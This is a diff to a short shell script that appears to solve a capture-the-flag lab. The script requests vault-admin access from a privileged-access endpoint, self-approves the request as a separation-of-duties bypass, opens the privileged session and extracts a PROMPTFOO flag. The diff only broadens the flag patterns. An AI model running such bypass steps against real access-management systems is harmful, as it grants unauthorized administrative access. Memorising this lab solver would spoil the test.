@@ -10,9 +10,9 @@ rid="$(curl -s "$BASE/pam/request?resource=vault-admin" | python3 -c 'import sys
 echo "[*] request_id=$rid"
 
 echo "[*] stage 1 — self-approve the request (separation-of-duties bypass) ->"
-curl -s "$BASE/pam/approve?request_id=$rid" | grep -o 'PROMPTFOO{s12a[^}]*}' | head -n1 || true
+curl -s "$BASE/pam/approve?request_id=$rid" | grep -o 'PROMPTFOO{[^}]*}' | head -n1 || true
 
 echo "[*] stage 2 — open the privileged session ->"
-flag="$(curl -s "$BASE/pam/session?request_id=$rid" | grep -o 'PROMPTFOO{s12_pam[^}]*}' | head -n1)"
+flag="$(curl -s "$BASE/pam/session?request_id=$rid" | grep -o 'PROMPTFOO{[^}]*}' | head -n1)"
 [ -n "$flag" ] || { echo "[!] flag not recovered" >&2; exit 1; }
 echo "$flag"
